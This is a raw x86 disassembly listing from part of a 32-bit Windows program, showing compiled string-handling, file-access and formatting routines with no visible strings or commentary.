  4037a7:	8b 07                	mov    (%edi),%eax
  4037a9:	eb 02                	jmp    0x4037ad
  4037ab:	8b c7                	mov    %edi,%eax
  4037ad:	53                   	push   %ebx
  4037ae:	8b 1d 24 a2 40 00    	mov    0x40a224,%ebx
  4037b4:	6a 2f                	push   $0x2f
  4037b6:	50                   	push   %eax
  4037b7:	ff d3                	call   *%ebx
  4037b9:	83 c4 08             	add    $0x8,%esp
  4037bc:	85 c0                	test   %eax,%eax
  4037be:	74 03                	je     0x4037c3
  4037c0:	40                   	inc    %eax
  4037c1:	eb 27                	jmp    0x4037ea
  4037c3:	83 7f 14 10          	cmpl   $0x10,0x14(%edi)
  4037c7:	72 04                	jb     0x4037cd
  4037c9:	8b 07                	mov    (%edi),%eax
  4037cb:	eb 02                	jmp    0x4037cf
  4037cd:	8b c7                	mov    %edi,%eax
  4037cf:	6a 5c                	push   $0x5c
  4037d1:	50                   	push   %eax
  4037d2:	ff d3                	call   *%ebx
  4037d4:	83 c4 08             	add    $0x8,%esp
  4037d7:	85 c0                	test   %eax,%eax
  4037d9:	74 03                	je     0x4037de
  4037db:	40                   	inc    %eax
  4037dc:	eb 0c                	jmp    0x4037ea
  4037de:	83 7f 14 10          	cmpl   $0x10,0x14(%edi)
  4037e2:	72 04                	jb     0x4037e8
  4037e4:	8b 07                	mov    (%edi),%eax
  4037e6:	eb 02                	jmp    0x4037ea
  4037e8:	8b c7                	mov    %edi,%eax
  4037ea:	8b c8                	mov    %eax,%ecx
  4037ec:	c7 46 14 0f 00 00 00 	movl   $0xf,0x14(%esi)
  4037f3:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  4037fa:	c6 06 00             	movb   $0x0,(%esi)
  4037fd:	8d 79 01             	lea    0x1(%ecx),%edi
  403800:	5b                   	pop    %ebx
  403801:	8a 11                	mov    (%ecx),%dl
  403803:	41                   	inc    %ecx
  403804:	84 d2                	test   %dl,%dl
  403806:	75 f9                	jne    0x403801
  403808:	2b cf                	sub    %edi,%ecx
  40380a:	8b f9                	mov    %ecx,%edi
  40380c:	e8 6f 38 00 00       	call   0x407080
  403811:	5f                   	pop    %edi
  403812:	8b c6                	mov    %esi,%eax
  403814:	5e                   	pop    %esi
  403815:	8b e5                	mov    %ebp,%esp
  403817:	5d                   	pop    %ebp
  403818:	c3                   	ret
  403819:	cc                   	int3
  40381a:	cc                   	int3
  40381b:	cc                   	int3
  40381c:	cc                   	int3
  40381d:	cc                   	int3
  40381e:	cc                   	int3
  40381f:	cc                   	int3
  403820:	55                   	push   %ebp
  403821:	8b ec                	mov    %esp,%ebp
  403823:	6a ff                	push   $0xffffffff
  403825:	68 09 91 40 00       	push   $0x409109
  40382a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403830:	50                   	push   %eax
  403831:	83 ec 48             	sub    $0x48,%esp
  403834:	a1 18 e0 40 00       	mov    0x40e018,%eax
  403839:	33 c5                	xor    %ebp,%eax
  40383b:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40383e:	56                   	push   %esi
  40383f:	57                   	push   %edi
  403840:	50                   	push   %eax
  403841:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403844:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40384a:	33 c0                	xor    %eax,%eax
  40384c:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  40384f:	8b f1                	mov    %ecx,%esi
  403851:	33 c9                	xor    %ecx,%ecx
  403853:	c7 43 14 07 00 00 00 	movl   $0x7,0x14(%ebx)
  40385a:	89 43 10             	mov    %eax,0x10(%ebx)
  40385d:	89 5d b0             	mov    %ebx,-0x50(%ebp)
  403860:	66 89 0b             	mov    %cx,(%ebx)
  403863:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403866:	88 4d d4             	mov    %cl,-0x2c(%ebp)
  403869:	8b ce                	mov    %esi,%ecx
  40386b:	c7 45 b4 01 00 00 00 	movl   $0x1,-0x4c(%ebp)
  403872:	c7 45 e8 0f 00 00 00 	movl   $0xf,-0x18(%ebp)
  403879:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40387c:	8d 79 01             	lea    0x1(%ecx),%edi
  40387f:	90                   	nop
  403880:	8a 01                	mov    (%ecx),%al
  403882:	41                   	inc    %ecx
  403883:	84 c0                	test   %al,%al
  403885:	75 f9                	jne    0x403880
  403887:	2b cf                	sub    %edi,%ecx
  403889:	8b c6                	mov    %esi,%eax
  40388b:	8b f9                	mov    %ecx,%edi
  40388d:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  403890:	e8 eb 37 00 00       	call   0x407080
  403895:	8b d6                	mov    %esi,%edx
  403897:	52                   	push   %edx
  403898:	8d 7d b8             	lea    -0x48(%ebp),%edi
  40389b:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4038a2:	e8 89 fb ff ff       	call   0x403430
  4038a7:	83 c4 04             	add    $0x4,%esp
  4038aa:	8b f8                	mov    %eax,%edi
  4038ac:	8b f3                	mov    %ebx,%esi
  4038ae:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  4038b2:	e8 19 2e 00 00       	call   0x4066d0
  4038b7:	83 7d cc 08          	cmpl   $0x8,-0x34(%ebp)
  4038bb:	8b 35 e8 a1 40 00    	mov    0x40a1e8,%esi
  4038c1:	72 09                	jb     0x4038cc
  4038c3:	8b 45 b8             	mov    -0x48(%ebp),%eax
  4038c6:	50                   	push   %eax
  4038c7:	ff d6                	call   *%esi
  4038c9:	83 c4 04             	add    $0x4,%esp
  4038cc:	33 c9                	xor    %ecx,%ecx
  4038ce:	83 7d e8 10          	cmpl   $0x10,-0x18(%ebp)
  4038d2:	c7 45 cc 07 00 00 00 	movl   $0x7,-0x34(%ebp)
  4038d9:	c7 45 c8 00 00 00 00 	movl   $0x0,-0x38(%ebp)
  4038e0:	66 89 4d b8          	mov    %cx,-0x48(%ebp)
  4038e4:	72 09                	jb     0x4038ef
  4038e6:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  4038e9:	52                   	push   %edx
  4038ea:	ff d6                	call   *%esi
  4038ec:	83 c4 04             	add    $0x4,%esp
  4038ef:	8b c3                	mov    %ebx,%eax
  4038f1:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4038f4:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4038fb:	59                   	pop    %ecx
  4038fc:	5f                   	pop    %edi
  4038fd:	5e                   	pop    %esi
  4038fe:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403901:	33 cd                	xor    %ebp,%ecx
  403903:	e8 78 48 00 00       	call   0x408180
  403908:	8b e5                	mov    %ebp,%esp
  40390a:	5d                   	pop    %ebp
  40390b:	c3                   	ret
  40390c:	cc                   	int3
  40390d:	cc                   	int3
  40390e:	cc                   	int3
  40390f:	cc                   	int3
  403910:	e8 4b 00 00 00       	call   0x403960
  403915:	68 cc a5 40 00       	push   $0x40a5cc
  40391a:	e8 c1 e1 ff ff       	call   0x401ae0
  40391f:	83 c4 04             	add    $0x4,%esp
  403922:	83 3d b8 11 41 00 00 	cmpl   $0x0,0x4111b8
  403929:	74 10                	je     0x40393b
  40392b:	68 84 a4 40 00       	push   $0x40a484
  403930:	e8 ab e1 ff ff       	call   0x401ae0
  403935:	83 c4 04             	add    $0x4,%esp
  403938:	33 c0                	xor    %eax,%eax
  40393a:	c3                   	ret
  40393b:	68 d8 a5 40 00       	push   $0x40a5d8
  403940:	c7 05 b8 11 41 00 01 	movl   $0x1,0x4111b8
  403947:	00 00 00 
  40394a:	e8 91 e1 ff ff       	call   0x401ae0
  40394f:	83 c4 04             	add    $0x4,%esp
  403952:	33 c0                	xor    %eax,%eax
  403954:	c3                   	ret
  403955:	cc                   	int3
  403956:	cc                   	int3
  403957:	cc                   	int3
  403958:	cc                   	int3
  403959:	cc                   	int3
  40395a:	cc                   	int3
  40395b:	cc                   	int3
  40395c:	cc                   	int3
  40395d:	cc                   	int3
  40395e:	cc                   	int3
  40395f:	cc                   	int3
  403960:	55                   	push   %ebp
  403961:	8b ec                	mov    %esp,%ebp
  403963:	51                   	push   %ecx
  403964:	53                   	push   %ebx
  403965:	8b 1d 0c a2 40 00    	mov    0x40a20c,%ebx
  40396b:	56                   	push   %esi
  40396c:	68 44 a6 40 00       	push   $0x40a644
  403971:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403978:	ff d3                	call   *%ebx
  40397a:	68 64 a6 40 00       	push   $0x40a664
  40397f:	ff d3                	call   *%ebx
  403981:	8b 35 14 a2 40 00    	mov    0x40a214,%esi
  403987:	68 80 a6 40 00       	push   $0x40a680
  40398c:	ff d6                	call   *%esi
  40398e:	83 c4 0c             	add    $0xc,%esp
  403991:	85 c0                	test   %eax,%eax
  403993:	74 0c                	je     0x4039a1
  403995:	68 80 a6 40 00       	push   $0x40a680
  40399a:	ff d6                	call   *%esi
  40399c:	83 c4 04             	add    $0x4,%esp
  40399f:	eb 05                	jmp    0x4039a6
  4039a1:	b8 40 a6 40 00       	mov    $0x40a640,%eax
  4039a6:	57                   	push   %edi
  4039a7:	8b 3d 30 a2 40 00    	mov    0x40a230,%edi
  4039ad:	50                   	push   %eax
  4039ae:	68 90 a6 40 00       	push   $0x40a690
  4039b3:	68 ff 00 00 00       	push   $0xff
  4039b8:	68 e0 e2 40 00       	push   $0x40e2e0
  4039bd:	ff d7                	call   *%edi
  4039bf:	68 9c a6 40 00       	push   $0x40a69c
  4039c4:	ff d6                	call   *%esi
  4039c6:	83 c4 14             	add    $0x14,%esp
  4039c9:	85 c0                	test   %eax,%eax
  4039cb:	74 0c                	je     0x4039d9
  4039cd:	68 9c a6 40 00       	push   $0x40a69c
  4039d2:	ff d6                	call   *%esi
  4039d4:	83 c4 04             	add    $0x4,%esp
  4039d7:	eb 05                	jmp    0x4039de
  4039d9:	b8 6c a3 40 00       	mov    $0x40a36c,%eax
  4039de:	50                   	push   %eax
  4039df:	68 a4 a6 40 00       	push   $0x40a6a4
  4039e4:	68 ff 00 00 00       	push   $0xff
  4039e9:	68 f0 e3 40 00       	push   $0x40e3f0
  4039ee:	ff d7                	call   *%edi
  4039f0:	8b 3d 34 a2 40 00    	mov    0x40a234,%edi
  4039f6:	83 c4 10             	add    $0x10,%esp
  4039f9:	be e0 e2 40 00       	mov    $0x40e2e0,%esi
  4039fe:	8b ff                	mov    %edi,%edi
  403a00:	56                   	push   %esi
  403a01:	68 b0 a6 40 00       	push   $0x40a6b0
  403a06:	ff d3                	call   *%ebx
  403a08:	6a 04                	push   $0x4
  403a0a:	56                   	push   %esi
  403a0b:	ff d7                	call   *%edi
  403a0d:	83 c4 10             	add    $0x10,%esp
  403a10:	85 c0                	test   %eax,%eax
  403a12:	75 1c                	jne    0x403a30
  403a14:	56                   	push   %esi
  403a15:	68 d0 a6 40 00       	push   $0x40a6d0
  403a1a:	e8 31 e1 ff ff       	call   0x401b50
  403a1f:	b8 01 00 00 00       	mov    $0x1,%eax
  403a24:	83 c4 08             	add    $0x8,%esp
  403a27:	89 86 08 01 00 00    	mov    %eax,0x108(%esi)
  403a2d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403a30:	81 c6 10 01 00 00    	add    $0x110,%esi
  403a36:	81 fe 10 e6 40 00    	cmp    $0x40e610,%esi
  403a3c:	7c c2                	jl     0x403a00
  403a3e:	83 7d fc 01          	cmpl   $0x1,-0x4(%ebp)
  403a42:	5f                   	pop    %edi
  403a43:	75 12                	jne    0x403a57
  403a45:	68 e8 a6 40 00       	push   $0x40a6e8
  403a4a:	ff d3                	call   *%ebx
  403a4c:	83 c4 04             	add    $0x4,%esp
  403a4f:	5e                   	pop    %esi
  403a50:	33 c0                	xor    %eax,%eax
  403a52:	5b                   	pop    %ebx
  403a53:	8b e5                	mov    %ebp,%esp
  403a55:	5d                   	pop    %ebp
  403a56:	c3                   	ret
  403a57:	68 08 a7 40 00       	push   $0x40a708
  403a5c:	ff d3                	call   *%ebx
  403a5e:	83 c4 04             	add    $0x4,%esp
  403a61:	5e                   	pop    %esi
  403a62:	33 c0                	xor    %eax,%eax
  403a64:	5b                   	pop    %ebx
  403a65:	8b e5                	mov    %ebp,%esp
  403a67:	5d                   	pop    %ebp
  403a68:	c3                   	ret
  403a69:	cc                   	int3
  403a6a:	cc                   	int3
  403a6b:	cc                   	int3
  403a6c:	cc                   	int3
  403a6d:	cc                   	int3
  403a6e:	cc                   	int3
  403a6f:	cc                   	int3
  403a70:	55                   	push   %ebp
  403a71:	8b ec                	mov    %esp,%ebp
  403a73:	56                   	push   %esi
  403a74:	57                   	push   %edi
  403a75:	8b 3d 0c a2 40 00    	mov    0x40a20c,%edi
  403a7b:	68 44 a6 40 00       	push   $0x40a644
  403a80:	ff d7                	call   *%edi
  403a82:	68 64 a6 40 00       	push   $0x40a664
  403a87:	ff d7                	call   *%edi
  403a89:	8b 35 14 a2 40 00    	mov    0x40a214,%esi
  403a8f:	68 80 a6 40 00       	push   $0x40a680
  403a94:	ff d6                	call   *%esi
  403a96:	83 c4 0c             	add    $0xc,%esp
  403a99:	85 c0                	test   %eax,%eax
  403a9b:	74 0c                	je     0x403aa9
  403a9d:	68 80 a6 40 00       	push   $0x40a680
  403aa2:	ff d6                	call   *%esi
  403aa4:	83 c4 04             	add    $0x4,%esp
  403aa7:	eb 05                	jmp    0x403aae
  403aa9:	b8 40 a6 40 00       	mov    $0x40a640,%eax
  403aae:	53                   	push   %ebx
  403aaf:	8b 1d 30 a2 40 00    	mov    0x40a230,%ebx
  403ab5:	50                   	push   %eax
  403ab6:	68 90 a6 40 00       	push   $0x40a690
  403abb:	68 ff 00 00 00       	push   $0xff
  403ac0:	68 e0 e2 40 00       	push   $0x40e2e0
  403ac5:	ff d3                	call   *%ebx
  403ac7:	68 9c a6 40 00       	push   $0x40a69c
  403acc:	ff d6                	call   *%esi
  403ace:	83 c4 14             	add    $0x14,%esp
  403ad1:	85 c0                	test   %eax,%eax
  403ad3:	74 0c                	je     0x403ae1
  403ad5:	68 9c a6 40 00       	push   $0x40a69c
  403ada:	ff d6                	call   *%esi
  403adc:	83 c4 04             	add    $0x4,%esp
  403adf:	eb 05                	jmp    0x403ae6
  403ae1:	b8 6c a3 40 00       	mov    $0x40a36c,%eax
  403ae6:	50                   	push   %eax
  403ae7:	68 a4 a6 40 00       	push   $0x40a6a4
  403aec:	68 ff 00 00 00       	push   $0xff
  403af1:	68 f0 e3 40 00       	push   $0x40e3f0
  403af6:	ff d3                	call   *%ebx
  403af8:	8b 75 08             	mov    0x8(%ebp),%esi
  403afb:	83 c4 10             	add    $0x10,%esp
  403afe:	5b                   	pop    %ebx
  403aff:	85 f6                	test   %esi,%esi
  403b01:	75 13                	jne    0x403b16
  403b03:	68 08 a7 40 00       	push   $0x40a708
  403b08:	83 ce ff             	or     $0xffffffff,%esi
  403b0b:	ff d7                	call   *%edi
  403b0d:	83 c4 04             	add    $0x4,%esp
  403b10:	5f                   	pop    %edi
  403b11:	8b c6                	mov    %esi,%eax
  403b13:	5e                   	pop    %esi
  403b14:	5d                   	pop    %ebp
  403b15:	c3                   	ret
  403b16:	56                   	push   %esi
  403b17:	68 b0 a6 40 00       	push   $0x40a6b0
  403b1c:	ff d7                	call   *%edi
  403b1e:	6a 04                	push   $0x4
  403b20:	56                   	push   %esi
  403b21:	ff 15 34 a2 40 00    	call   *0x40a234
  403b27:	83 c4 10             	add    $0x10,%esp
  403b2a:	85 c0                	test   %eax,%eax
  403b2c:	75 d5                	jne    0x403b03
  403b2e:	56                   	push   %esi
  403b2f:	68 d0 a6 40 00       	push   $0x40a6d0
  403b34:	e8 17 e0 ff ff       	call   0x401b50
  403b39:	68 e8 a6 40 00       	push   $0x40a6e8
  403b3e:	ff d7                	call   *%edi
  403b40:	83 c4 0c             	add    $0xc,%esp
  403b43:	5f                   	pop    %edi
  403b44:	33 c0                	xor    %eax,%eax
  403b46:	5e                   	pop    %esi
  403b47:	5d                   	pop    %ebp
  403b48:	c3                   	ret
  403b49:	cc                   	int3
  403b4a:	cc                   	int3
  403b4b:	cc                   	int3
  403b4c:	cc                   	int3
  403b4d:	cc                   	int3
  403b4e:	cc                   	int3
  403b4f:	cc                   	int3
  403b50:	55                   	push   %ebp
  403b51:	8b ec                	mov    %esp,%ebp
  403b53:	6a ff                	push   $0xffffffff
  403b55:	68 8c 8d 40 00       	push   $0x408d8c
  403b5a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403b60:	50                   	push   %eax
  403b61:	51                   	push   %ecx
  403b62:	56                   	push   %esi
  403b63:	a1 18 e0 40 00       	mov    0x40e018,%eax
  403b68:	33 c5                	xor    %ebp,%eax
  403b6a:	50                   	push   %eax
  403b6b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403b6e:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  403b74:	8b 01                	mov    (%ecx),%eax
  403b76:	8d 71 50             	lea    0x50(%ecx),%esi
  403b79:	8b 48 04             	mov    0x4(%eax),%ecx
  403b7c:	89 75 f0             	mov    %esi,-0x10(%ebp)
  403b7f:	c7 44 31 b0 34 a9 40 	movl   $0x40a934,-0x50(%ecx,%esi,1)
  403b86:	00 
  403b87:	8d 4e b4             	lea    -0x4c(%esi),%ecx
  403b8a:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403b91:	e8 1a 1e 00 00       	call   0x4059b0
  403b96:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  403b9d:	8b 56 b0             	mov    -0x50(%esi),%edx
  403ba0:	8b 0d 34 a1 40 00    	mov    0x40a134,%ecx
  403ba6:	8b 42 04             	mov    0x4(%edx),%eax
  403ba9:	89 4c 30 b0          	mov    %ecx,-0x50(%eax,%esi,1)
  403bad:	8b ce                	mov    %esi,%ecx
  403baf:	ff 15 6c a1 40 00    	call   *0x40a16c
  403bb5:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403bb8:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403bbf:	59                   	pop    %ecx
  403bc0:	5e                   	pop    %esi
  403bc1:	8b e5                	mov    %ebp,%esp
  403bc3:	5d                   	pop    %ebp
  403bc4:	c3                   	ret
  403bc5:	cc                   	int3
  403bc6:	cc                   	int3
  403bc7:	cc                   	int3
  403bc8:	cc                   	int3
  403bc9:	cc                   	int3
  403bca:	cc                   	int3
  403bcb:	cc                   	int3
  403bcc:	cc                   	int3
  403bcd:	cc                   	int3
  403bce:	cc                   	int3
  403bcf:	cc                   	int3
  403bd0:	55                   	push   %ebp
  403bd1:	8b ec                	mov    %esp,%ebp
  403bd3:	51                   	push   %ecx
  403bd4:	53                   	push   %ebx
  403bd5:	56                   	push   %esi
  403bd6:	57                   	push   %edi
  403bd7:	8b f8                	mov    %eax,%edi
  403bd9:	85 ff                	test   %edi,%edi
  403bdb:	75 0a                	jne    0x403be7
  403bdd:	83 c8 ff             	or     $0xffffffff,%eax
  403be0:	5f                   	pop    %edi
  403be1:	5e                   	pop    %esi
  403be2:	5b                   	pop    %ebx
  403be3:	8b e5                	mov    %ebp,%esp
  403be5:	5d                   	pop    %ebp
  403be6:	c3                   	ret
  403be7:	b8 c0 11 41 00       	mov    $0x4111c0,%eax
  403bec:	8d 50 01             	lea    0x1(%eax),%edx
  403bef:	90                   	nop
  403bf0:	8a 08                	mov    (%eax),%cl
  403bf2:	40                   	inc    %eax
  403bf3:	84 c9                	test   %cl,%cl
  403bf5:	75 f9                	jne    0x403bf0
  403bf7:	2b c2                	sub    %edx,%eax
  403bf9:	bb c0 11 41 00       	mov    $0x4111c0,%ebx
  403bfe:	75 05                	jne    0x403c05
  403c00:	bb 10 e6 40 00       	mov    $0x40e610,%ebx
  403c05:	8b c7                	mov    %edi,%eax
  403c07:	8d 50 01             	lea    0x1(%eax),%edx
  403c0a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  403c10:	8a 08                	mov    (%eax),%cl
  403c12:	40                   	inc    %eax
  403c13:	84 c9                	test   %cl,%cl
  403c15:	75 f9                	jne    0x403c10
  403c17:	2b c2                	sub    %edx,%eax
  403c19:	75 05                	jne    0x403c20
  403c1b:	bf b0 e8 40 00       	mov    $0x40e8b0,%edi
  403c20:	6a 04                	push   $0x4
  403c22:	57                   	push   %edi
  403c23:	ff 15 34 a2 40 00    	call   *0x40a234
  403c29:	83 c4 08             	add    $0x8,%esp
  403c2c:	85 c0                	test   %eax,%eax
  403c2e:	74 3e                	je     0x403c6e
  403c30:	68 64 a7 40 00       	push   $0x40a764
  403c35:	57                   	push   %edi
  403c36:	ff 15 38 a2 40 00    	call   *0x40a238
  403c3c:	8b f0                	mov    %eax,%esi
  403c3e:	83 c4 08             	add    $0x8,%esp
  403c41:	85 f6                	test   %esi,%esi
  403c43:	74 29                	je     0x403c6e
  403c45:	8b c3                	mov    %ebx,%eax
  403c47:	8d 50 01             	lea    0x1(%eax),%edx
  403c4a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  403c50:	8a 08                	mov    (%eax),%cl
  403c52:	40                   	inc    %eax
  403c53:	84 c9                	test   %cl,%cl
  403c55:	75 f9                	jne    0x403c50
  403c57:	56                   	push   %esi
  403c58:	2b c2                	sub    %edx,%eax
  403c5a:	50                   	push   %eax
  403c5b:	6a 01                	push   $0x1
  403c5d:	53                   	push   %ebx
  403c5e:	ff 15 3c a2 40 00    	call   *0x40a23c
  403c64:	56                   	push   %esi
  403c65:	ff 15 40 a2 40 00    	call   *0x40a240
  403c6b:	83 c4 14             	add    $0x14,%esp
  403c6e:	85 ff                	test   %edi,%edi
  403c70:	0f 84 67 ff ff ff    	je     0x403bdd
  403c76:	8b c7                	mov    %edi,%eax
  403c78:	8d 50 01             	lea    0x1(%eax),%edx
  403c7b:	eb 03                	jmp    0x403c80
  403c7d:	8d 49 00             	lea    0x0(%ecx),%ecx
  403c80:	8a 08                	mov    (%eax),%cl
  403c82:	40                   	inc    %eax
  403c83:	84 c9                	test   %cl,%cl
  403c85:	75 f9                	jne    0x403c80
  403c87:	2b c2                	sub    %edx,%eax
  403c89:	74 14                	je     0x403c9f
  403c8b:	57                   	push   %edi
  403c8c:	e8 df fd ff ff       	call   0x403a70
  403c91:	83 c4 04             	add    $0x4,%esp
  403c94:	8b cf                	mov    %edi,%ecx
  403c96:	e8 25 df ff ff       	call   0x401bc0
  403c9b:	85 c0                	test   %eax,%eax
  403c9d:	74 05                	je     0x403ca4
  403c9f:	e8 6c fc ff ff       	call   0x403910
  403ca4:	5f                   	pop    %edi
  403ca5:	5e                   	pop    %esi
  403ca6:	5b                   	pop    %ebx
  403ca7:	8b e5                	mov    %ebp,%esp
  403ca9:	5d                   	pop    %ebp
  403caa:	c3                   	ret
  403cab:	cc                   	int3
  403cac:	cc                   	int3
  403cad:	cc                   	int3
  403cae:	cc                   	int3
  403caf:	cc                   	int3
  403cb0:	55                   	push   %ebp
  403cb1:	8b ec                	mov    %esp,%ebp
  403cb3:	83 ec 74             	sub    $0x74,%esp
  403cb6:	a1 18 e0 40 00       	mov    0x40e018,%eax
  403cbb:	33 c5                	xor    %ebp,%eax
  403cbd:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403cc0:	53                   	push   %ebx
  403cc1:	33 db                	xor    %ebx,%ebx
  403cc3:	56                   	push   %esi
  403cc4:	57                   	push   %edi
  403cc5:	b8 48 a4 40 00       	mov    $0x40a448,%eax
  403cca:	39 1d c4 f6 40 00    	cmp    %ebx,0x40f6c4
  403cd0:	75 05                	jne    0x403cd7
  403cd2:	b8 40 a4 40 00       	mov    $0x40a440,%eax
  403cd7:	8b 0d c8 f6 40 00    	mov    0x40f6c8,%ecx
  403cdd:	8b 15 b8 f5 40 00    	mov    0x40f5b8,%edx
  403ce3:	51                   	push   %ecx
  403ce4:	50                   	push   %eax
  403ce5:	52                   	push   %edx
  403ce6:	68 b8 f4 40 00       	push   $0x40f4b8
  403ceb:	68 b8 f0 40 00       	push   $0x40f0b8
  403cf0:	68 b8 e8 40 00       	push   $0x40e8b8
  403cf5:	68 38 f5 40 00       	push   $0x40f538
  403cfa:	68 d0 f6 40 00       	push   $0x40f6d0
  403cff:	68 00 10 00 00       	push   $0x1000
  403d04:	68 c0 11 41 00       	push   $0x4111c0
  403d09:	ff 15 08 a2 40 00    	call   *0x40a208
  403d0f:	b8 c0 11 41 00       	mov    $0x4111c0,%eax
  403d14:	83 c4 28             	add    $0x28,%esp
  403d17:	c7 45 d8 0f 00 00 00 	movl   $0xf,-0x28(%ebp)
  403d1e:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  403d21:	88 5d c4             	mov    %bl,-0x3c(%ebp)
  403d24:	8d 50 01             	lea    0x1(%eax),%edx
  403d27:	8a 08                	mov    (%eax),%cl
  403d29:	40                   	inc    %eax
  403d2a:	3a cb                	cmp    %bl,%cl
  403d2c:	75 f9                	jne    0x403d27
  403d2e:	2b c2                	sub    %edx,%eax
  403d30:	8b f8                	mov    %eax,%edi
  403d32:	b8 c0 11 41 00       	mov    $0x4111c0,%eax
  403d37:	8d 75 c4             	lea    -0x3c(%ebp),%esi
  403d3a:	e8 41 33 00 00       	call   0x407080
  403d3f:	33 ff                	xor    %edi,%edi
  403d41:	b8 6c a3 40 00       	mov    $0x40a36c,%eax
  403d46:	8d 75 e0             	lea    -0x20(%ebp),%esi
  403d49:	c7 45 f4 0f 00 00 00 	movl   $0xf,-0xc(%ebp)
  403d50:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  403d53:	88 5d e0             	mov    %bl,-0x20(%ebp)
  403d56:	e8 25 33 00 00       	call   0x407080
  403d5b:	8b c6                	mov    %esi,%eax
  403d5d:	50                   	push   %eax
  403d5e:	b8 c4 f5 40 00       	mov    $0x40f5c4,%eax
  403d63:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  403d66:	e8 d5 41 00 00       	call   0x407f40
  403d6b:	83 c4 04             	add    $0x4,%esp
  403d6e:	83 7d f4 10          	cmpl   $0x10,-0xc(%ebp)
  403d72:	72 0d                	jb     0x403d81
  403d74:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  403d77:	51                   	push   %ecx
  403d78:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  403d7e:	83 c4 04             	add    $0x4,%esp
  403d81:	bf 02 00 00 00       	mov    $0x2,%edi
  403d86:	b8 68 a7 40 00       	mov    $0x40a768,%eax
  403d8b:	8d 75 e0             	lea    -0x20(%ebp),%esi
  403d8e:	c7 45 f4 0f 00 00 00 	movl   $0xf,-0xc(%ebp)
  403d95:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  403d98:	88 5d e0             	mov    %bl,-0x20(%ebp)
  403d9b:	e8 e0 32 00 00       	call   0x407080
  403da0:	8d 55 8c             	lea    -0x74(%ebp),%edx
  403da3:	52                   	push   %edx
  403da4:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  403da7:	e8 84 f7 ff ff       	call   0x403530
  403dac:	83 c4 04             	add    $0x4,%esp
  403daf:	83 7d f4 10          	cmpl   $0x10,-0xc(%ebp)
  403db3:	72 0d                	jb     0x403dc2
  403db5:	8b 45 e0             	mov    -0x20(%ebp),%eax
  403db8:	50                   	push   %eax
  403db9:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  403dbf:	83 c4 04             	add    $0x4,%esp
  403dc2:	bf 18 00 00 00       	mov    $0x18,%edi
  403dc7:	b8 6c a7 40 00       	mov    $0x40a76c,%eax
  403dcc:	8d 75 e0             	lea    -0x20(%ebp),%esi
  403dcf:	c7 45 f4 0f 00 00 00 	movl   $0xf,-0xc(%ebp)
  403dd6:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  403dd9:	88 5d e0             	mov    %bl,-0x20(%ebp)
  403ddc:	e8 9f 32 00 00       	call   0x407080
  403de1:	8b ce                	mov    %esi,%ecx
  403de3:	51                   	push   %ecx
  403de4:	b8 c4 f5 40 00       	mov    $0x40f5c4,%eax
  403de9:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  403dec:	e8 4f 41 00 00       	call   0x407f40
  403df1:	83 c4 04             	add    $0x4,%esp
  403df4:	83 7d f4 10          	cmpl   $0x10,-0xc(%ebp)
  403df8:	72 0d                	jb     0x403e07
  403dfa:	8b 55 e0             	mov    -0x20(%ebp),%edx
  403dfd:	52                   	push   %edx
  403dfe:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  403e04:	83 c4 04             	add    $0x4,%esp
  403e07:	bf 17 00 00 00       	mov    $0x17,%edi
  403e0c:	b8 88 a7 40 00       	mov    $0x40a788,%eax
  403e11:	8d 75 e0             	lea    -0x20(%ebp),%esi
  403e14:	c7 45 f4 0f 00 00 00 	movl   $0xf,-0xc(%ebp)
  403e1b:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  403e1e:	88 5d e0             	mov    %bl,-0x20(%ebp)
  403e21:	e8 5a 32 00 00       	call   0x407080
  403e26:	8d 45 a8             	lea    -0x58(%ebp),%eax
  403e29:	50                   	push   %eax
  403e2a:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  403e2d:	e8 fe f6 ff ff       	call   0x403530
  403e32:	bf 10 00 00 00       	mov    $0x10,%edi
  403e37:	83 c4 04             	add    $0x4,%esp
  403e3a:	39 7d f4             	cmp    %edi,-0xc(%ebp)
  403e3d:	72 0d                	jb     0x403e4c
  403e3f:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  403e42:	51                   	push   %ecx
  403e43:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  403e49:	83 c4 04             	add    $0x4,%esp
  403e4c:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  403e4f:	39 7d d8             	cmp    %edi,-0x28(%ebp)
